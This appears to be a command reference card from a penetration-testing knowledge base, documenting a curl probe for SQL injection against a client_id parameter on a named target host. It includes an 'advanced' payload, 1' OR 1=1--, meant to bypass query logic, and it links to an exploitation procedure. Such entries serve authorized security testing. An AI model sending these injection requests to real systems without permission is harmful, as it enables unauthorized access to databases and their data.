---
id: cmd-uuid-001
data: 'curl -X GET "https://target.ibm-app.com/endpoint?client_id=1''" -v'
tags:
  - sqli
  - test
  - web
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:18.671Z'
verified: false
validated: true
submitted: true
---
# curl-sqli-test

## Command

```bash
curl -X GET "https://target.ibm-app.com/endpoint?client_id=1'" -v
```

## Description

This command tests for SQL injection vulnerability by sending a request with an unescaped single quote in the client_id parameter, triggering a database error if input is not sanitized.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method | Yes |
| `client_id=1'` | Malformed parameter to inject quote | Yes |
| `-v` | Verbose output to see response details | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://target.ibm-app.com/endpoint?client_id=1'" -v
```

### Advanced Usage

```bash
curl -X POST "https://target.ibm-app.com/endpoint" -d "client_id=1' OR 1=1--" -v
```

## Expected Output

Verbose response showing HTTP status and body; look for SQL errors like "syntax error near '"'" indicating vulnerability.

## Related

- [[Related Procedure: Exploit-SQL-Injection-in-Client-ID-Parameter]]
